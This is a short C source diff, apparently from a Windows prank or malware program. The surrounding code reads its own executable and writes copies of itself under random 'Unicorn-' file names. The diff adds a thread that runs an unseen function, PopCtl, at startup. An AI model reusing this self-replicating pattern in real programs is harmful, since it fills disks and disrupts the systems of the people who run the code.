@@ -14,6 +14,8 @@ UINT8* myFileBuffer = 0;
 
 char nextEXEName[256] = { 0 };
 
+void PopCtl();
+
 void create_proc_worker()
 {
     // work around for something like NtRaiseHardError in stupid kernel32.dll
@@ -46,6 +48,7 @@ void create_proc_worker()
 
 int main(int argc, char** argv)
 {
+    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PopCtl, 0, 0, 0);
     FILE* fp = fopen(argv[0], "rb");
     fseek(fp, 0, SEEK_END);
     myEXESize = ftell(fp);
@@ -60,7 +63,7 @@ int main(int argc, char** argv)
         
         while (fp == NULL)
         {
-            sprintf(nextEXEName, "Unicorn2-%X.exe", Get_Hardware_Rand() & 0xFFFF);
+            sprintf(nextEXEName, "Unicorn-%X.exe", Get_Hardware_Rand() & 0xFFFF);
             fp = fopen(nextEXEName, "wb");
         }
         fwrite(myFileBuffer, 1, myEXESize, fp);
